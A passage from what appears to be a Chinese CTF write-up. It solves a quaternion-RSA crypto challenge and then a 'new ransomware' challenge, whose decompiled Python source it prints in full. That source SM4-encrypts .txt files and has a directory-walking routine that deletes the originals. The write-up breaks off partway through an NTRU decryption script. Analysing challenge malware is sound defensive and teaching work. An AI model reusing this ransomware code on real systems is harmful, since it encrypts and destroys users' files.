<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>a &#x3D; h0<em>0 - h1</em>p - h2<em>q - h3</em>r</p>
<p>b &#x3D; h0<em>p + h1</em>0 + h2<em>r - h3</em>q</p>
<p>c &#x3D; h0<em>q - h1</em>r + h2<em>0 + h3</em>p</p>
<p>d &#x3D; h0<em>r + h1</em>q - h2<em>p + h3</em>0</p>
<p>对每个分量模p就得到gift，gift &#x3D; (hints * keys) % P。因此，如果我们能找到hints的逆四元数H_inv，使得H_inv * hints ≡ 1 mod P（这里的1是四元数[1,0,0,0]），那么就可以通过gift * H_inv mod P来得到keys。因为gift ≡ hints * keys mod P。</p>
<p>这里需要补充一个知识点，四元数的逆为其共轭除以模长平方。</p>
<p><img src="https://ooo.0x0.ooo/2025/04/08/O047o1.png" alt="O047o1.png"></p>
<p>将H_inv与gift进行四元数乘法，结果模P后得到keys：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b0 = (a0 * g0 - a1 * g1 - a2 * g2 - a3 * g3) % P</span><br><span class="line">b1 = (a0 * g1 + a1 * g0 + a2 * g3 - a3 * g2) % P</span><br><span class="line">b2 = (a0 * g2 - a1 * g3 + a2 * g0 + a3 * g1) % P</span><br><span class="line">b3 = (a0 * g3 + a1 * g2 - a2 * g1 + a3 * g0) % P</span><br></pre></td></tr></table></figure>

<p>解得p&#x3D;b1,q&#x3D;b2,r&#x3D;b3.</p>
<p>四元数的欧拉函数为phi(pqr) &#x3D; (p−1)p(p+1)(q −1)q(q +1)(r −1)r(r +1)。</p>
<p>但是本题的e为65547，gcd(e,phi)&#x3D;27。出题人给出的wp里说是gcd是9，要两次AMM的开立方根，感觉有点问题。自己试了一下。直接phi&#x2F;&#x2F;27就行，但是没太懂是为啥。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        self.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(self.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">hints = [<span class="number">375413371936</span>, <span class="number">452903063925</span>, <span class="number">418564633198</span>, <span class="number">452841062207</span>]</span><br><span class="line">gift = [</span><br><span class="line">    <span class="number">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span>,</span><br><span class="line">    <span class="number">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span>,</span><br><span class="line">    <span class="number">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span>,</span><br><span class="line">    <span class="number">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span></span><br><span class="line">]</span><br><span class="line">P = <span class="number">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line">n = <span class="number">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"></span><br><span class="line">h0, h1, h2, h3 = hints</span><br><span class="line">g0, g1, g2, g3 = gift</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算norm_H</span></span><br><span class="line">norm_H = (<span class="built_in">pow</span>(h0, <span class="number">2</span>, P) + <span class="built_in">pow</span>(h1, <span class="number">2</span>, P) + <span class="built_in">pow</span>(h2, <span class="number">2</span>, P) + <span class="built_in">pow</span>(h3, <span class="number">2</span>, P)) % P</span><br><span class="line">inv_norm_H = inverse(norm_H, P)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造H_inv</span></span><br><span class="line">a0 = (h0 * inv_norm_H) % P</span><br><span class="line">a1 = (-h1 * inv_norm_H) % P</span><br><span class="line">a2 = (-h2 * inv_norm_H) % P</span><br><span class="line">a3 = (-h3 * inv_norm_H) % P</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四元数乘法 H_inv * gift</span></span><br><span class="line">b0 = (a0 * g0 - a1 * g1 - a2 * g2 - a3 * g3) % P</span><br><span class="line">b1 = (a0 * g1 + a1 * g0 + a2 * g3 - a3 * g2) % P</span><br><span class="line">b2 = (a0 * g2 - a1 * g3 + a2 * g0 + a3 * g1) % P</span><br><span class="line">b3 = (a0 * g3 + a1 * g2 - a2 * g1 + a3 * g0) % P</span><br><span class="line"></span><br><span class="line">p, q, r = b1, b2, b3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证乘积</span></span><br><span class="line"><span class="keyword">assert</span> (p * q * r) == n, <span class="string">&quot;p*q*r != n&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>\nq = <span class="subst">&#123;q&#125;</span>\nr = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">n=p*q*r</span><br><span class="line">phi=(p-<span class="number">1</span>)*p*(p+<span class="number">1</span>)*(q-<span class="number">1</span>)*q*(q +<span class="number">1</span>)*(r-<span class="number">1</span>)*r*(r+<span class="number">1</span>)//<span class="number">27</span></span><br><span class="line">e=<span class="number">65547</span></span><br><span class="line"><span class="built_in">print</span>(gcd(e,phi))</span><br><span class="line">d=invert(e,phi)</span><br><span class="line">cc= ComComplex([<span class="number">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span>,<span class="number">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span>,<span class="number">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span>,<span class="number">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span>])</span><br><span class="line">m=<span class="built_in">pow</span>(cc,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;&quot;</span>.join([long_to_bytes(i) <span class="keyword">for</span> i <span class="keyword">in</span> m.value]))</span><br></pre></td></tr></table></figure>

<h1 id="4-新勒索病毒"><a href="#4-新勒索病毒" class="headerlink" title="4,新勒索病毒"></a>4,新勒索病毒</h1><p>赛中非预期做的，还是按正常做法做做吧。</p>
<p>首先我们看到给了一个enc文件和exe文件，exe文件打不开。那么思路首先是尝试反编译这个exe文件从而得到python加密源码。这里使用的是pyinstxtractor，值得一提的是必须在python3.8版本才能使用（重新配环境花了蛮久时间XD），然后在终端运行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python pyinstxtractor.py task.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://ooo.0x0.ooo/2025/04/08/O04v2b.png" alt="O04v2b.png"></p>
<p>此时在同一个目录下就会出现task.exe_extracted文件夹。打开后需要找到和原文件同名的文件，并加上pyc文件后缀。即task.pyc,此时我们用16进制编辑器打开就能看到加密代码。</p>
<p><img src="https://ooo.0x0.ooo/2025/04/08/O04gWl.png" alt="O04gWl.png"></p>
<p>然后直接bytes.fromhex()即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randrange</span><br><span class="line"></span><br><span class="line">N = <span class="number">49</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">128</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q &gt; (<span class="number">6</span> * d + <span class="number">1</span>) * p</span><br><span class="line">R. &lt; x &gt; = ZZ[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_T</span>(<span class="params">d1, d2</span>):</span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1 + d2</span><br><span class="line">    s = [<span class="number">1</span>] * d1 + [-<span class="number">1</span>] * d2 + [<span class="number">0</span>] * (N - d1 - d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    <span class="keyword">return</span> R(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_prime</span>(<span class="params">f, p</span>):</span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x ^ N - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x ^ N - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_mod</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">return</span> R([((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mod</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">return</span> R([f[i] % q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_pow2</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = lift_mod(convolution(g, f), q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = lift_mod(convolution(g, <span class="number">2</span> - r), q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_message</span>():</span><br><span class="line">    <span class="keyword">return</span> R([randrange(p) - <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = generate_T(d + <span class="number">1</span>, d)</span><br><span class="line">            g = generate_T(d, d)</span><br><span class="line">            Fp = poly_mod(invert_mod_prime(f, p), p)</span><br><span class="line">            Fq = poly_mod(invert_mod_pow2(f, q), q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    h = poly_mod(convolution(Fq, g), q)</span><br><span class="line">    <span class="keyword">return</span> h, (f, g)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">m, h</span>):</span><br><span class="line">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_ntru_keys</span>():</span><br><span class="line">    h, secret = generate_key()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(h))</span><br><span class="line">    m = generate_message()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;priv_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(m))</span><br><span class="line">    e = encrypt_message(m, h)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):</span><br><span class="line">    terms = []</span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span></span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        term = <span class="keyword">match</span>.group()</span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            terms.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:</span><br><span class="line">            terms.append(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                coeff = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                coeff = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)</span><br><span class="line">            terms.append(coeff * exponent)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                terms.append(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">0</span>)</span><br><span class="line">                terms.append(-<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> terms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):</span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:</span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)</span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:</span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))</span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_polynomial_from_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;SM4 key must be 16 bytes&quot;</span></span><br><span class="line">    cipher = sm4.CryptSM4()</span><br><span class="line">    cipher.set_key(key, sm4.SM4_ENCRYPT)</span><br><span class="line">    padded_plaintext = pad(plaintext, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher.crypt_ecb(padded_plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt_file</span>(<span class="params">input_path, output_path, key</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        plaintext = f.read()</span><br><span class="line"></span><br><span class="line">    ciphertext = sm4_encrypt(key, plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ciphertext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_directory</span>(<span class="params">directory, sm4_key, extensions=[<span class="string">&quot;.txt&quot;</span>]</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Directory does not exist: <span class="subst">&#123;directory&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.endswith(ext) <span class="keyword">for</span> ext <span class="keyword">in</span> extensions):</span><br><span class="line">                input_path = os.path.join(root, file)</span><br><span class="line">                output_path = input_path + <span class="string">&quot;.enc&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    sm4_encrypt_file(input_path, output_path, sm4_key)</span><br><span class="line">                    os.remove(input_path)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;input_path&#125;</span> -&gt; <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Error encrypting <span class="subst">&#123;input_path&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        save_ntru_keys()</span><br><span class="line">        poly_str = read_polynomial_from_file(<span class="string">&quot;priv_key.txt&quot;</span>)</span><br><span class="line">        poly_terms = terms(poly_str)</span><br><span class="line">        sm4_key = binascii.unhexlify(poly_terms)</span><br><span class="line">        user_name = os.getlogin()</span><br><span class="line">        target_dir = os.path.join(<span class="string">&quot;C:\Users&quot;</span>, user_name, <span class="string">&quot;Desktop&quot;</span>, <span class="string">&quot;test_files&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">            os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Created directory: <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        txt_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(target_dir)</span><br><span class="line">                     <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.txt&#x27;</span>) <span class="keyword">and</span> os.path.isfile(os.path.join(target_dir, f))]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> txt_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No .txt files found in directory&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> txt_file <span class="keyword">in</span> txt_files:</span><br><span class="line">            file_path = os.path.join(target_dir, txt_file)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    test_data = f.read()</span><br><span class="line"></span><br><span class="line">                ciphertext = sm4_encrypt(sm4_key, test_data)</span><br><span class="line">                encrypted_path = file_path + <span class="string">&#x27;.enc&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(ciphertext)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error processing <span class="subst">&#123;txt_file&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Fatal error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>首先根据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">m, h</span>):</span><br><span class="line">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)</span><br><span class="line">    <span class="keyword">return</span> e</span><br></pre></td></tr></table></figure>

<p>NTRU解密得到priv_key.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">Zx = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = Zx.gen()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">center_polynomial_coefficients</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">return</span> Zx([((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f.coefficients()))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_cyclic_convolution</span>(<span class="params">f, g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x**n - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_polynomial_prime_modulus</span>(<span class="params">f, p</span>):</span><br><span class="line">    T = Zx.change_ring(Integers(p)).quotient(x**n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_polynomial_power_of_two</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span 